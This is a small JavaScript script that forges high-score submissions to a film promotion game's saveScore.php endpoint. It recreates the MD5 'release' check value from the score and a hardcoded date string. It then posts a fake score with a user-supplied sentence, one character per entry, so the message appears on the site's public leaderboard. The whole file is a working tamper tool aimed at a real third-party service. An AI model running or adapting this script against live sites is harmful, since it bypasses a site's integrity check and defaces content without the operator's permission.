const url = 'https://cocainebear-game.films.apps.nbcuni.com/saveScore.php';
const CryptoJS = require('crypto-js');
const prompt = require('prompt-sync')({ sigint: true });
const score = "4206942069"

async function sleep(millis) {
    return new Promise(resolve => setTimeout(resolve, millis));
}

function saveScore(name, score) {
    let release = CryptoJS.MD5(score + '10/31/22').toString();
    fetch(url, {
        "method": 'POST',
        "body": `name=${name}&score=${score}&release=${release}`,
        "headers" : {
            "content-type": 'application/x-www-form-urlencoded; charset=UTF-8'
        }
    });
}

async function main() {
    text = prompt('Enter the sentence you want to show on the site: ');
    text = text.toUpperCase();
    text = text.split("").reverse().join("");
    for (let char of text) {
        await sleep(1000);
        saveScore("("+char+")", score);
        console.log(`Sent ${char}`);
    }
}

main();